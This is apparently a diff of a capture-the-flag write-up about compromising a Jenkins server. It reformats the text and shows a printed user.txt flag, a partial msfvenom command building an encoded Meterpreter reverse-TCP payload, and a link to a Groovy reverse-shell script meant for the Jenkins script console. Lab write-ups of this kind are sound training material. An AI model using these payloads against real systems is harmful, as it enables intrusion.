@@ -184,9 +184,7 @@ Mode                LastWriteTime     Length Name
 -a---        10/25/2019  11:22 PM         32 user.txt                          
 
 PS C:\Program Files (x86)\Jenkins\workspace\project> type c:\users\bruce\desktop\user.txt
-79007a09481963edf2e1321abd9ae2a0
-PS C:\Program Files (x86)\Jenkins\workspace\project> 
-
+79007a09481963edf2e1321abd9ae2a0 
 ```
 ---
 ### Q4 What is the user.txt flag? 
@@ -205,10 +203,11 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 ```
 Next to transfer it, I tried groovy shell in script console in manage jenkins section, clearly a less stable option than the recommended powershell only option. 
 
-## Trying to connect using groovy:
+### Trying to connect using groovy:
+
 So starters quick reverse shell back in using groovy instead it appears easier, here is one link for a classic groovy reverse shell:
-```
-groovy shell from googlesearch was same as one found on revshells.com
+
+The groovy shell from googlesearch was same as one found on revshells.com
 ```
 https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
 ```
